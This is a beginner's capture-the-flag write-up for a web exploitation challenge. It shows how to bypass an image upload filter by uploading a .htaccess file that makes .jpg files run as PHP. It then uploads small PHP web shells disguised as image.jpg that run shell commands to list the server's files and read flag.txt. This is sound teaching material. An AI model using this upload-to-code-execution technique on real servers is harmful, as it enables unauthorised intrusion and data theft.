
# Corrupted File
* Difficulty : Medium
* Tag : Web Exploitation
* Author : Yahaya Meddy

Please note that I'm still a beginner at CTF !! There may be some mistakes.

## First inspection

For this challenge, as it is a web exploitation challenge, I used my trusty Firefox browser inspector. But there was nothing special in the code nor in the Network tab. I tried uploading files with different extensions : .png, .jpg, .gif, but also .mp4 and .py, and everything worked despite the Challenge's description warning us about strict image files filters. 

Uploading a .php file didn't work though !


## .htaccess

 The challenge's hint says :

> Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.

Browsing into Apache's .htaccess documentation and explanation, I found that any directory can have its own .htaccess file. I also found this interesting directive `AddType`. 

> AddType directive maps the given filename extensions onto the specified content type

So I created a file named `.htaccess` containing :

    AddType application/x-httpd-php .jpg


I successfully uploaded this file, and it now means that any .jpg file in the images/ folder will be parsed as php.

## Flag hunt

So let's create a little php file. As the images where uploaded in an images/ directory, I thought we could search for other folders and files.

 I created a text file called image.jpg containing a php script. I'm new to php so I kept it simple :

    <?php
    $output = shell_exec('find ../..');
    echo "<pre>$output</pre>";
    ?>

The output after uploading this file is quite interesting ! 

    ../..
    ../../html
    ../../html/images
    ../../html/images/image.jpg
    ../../html/images/.htaccess
    ../../html/index.php
    ../../html/upload.php
    ../../flag.txt

Let's reupload a script to see what's in `../../flag.txt` :

    <?php
    $output = shell_exec('cat ../../flag.txt');
    echo "<pre>$output</pre>";
    ?>


That's how I got the flag !

And voilà ! Thank you for reading ! 🤓
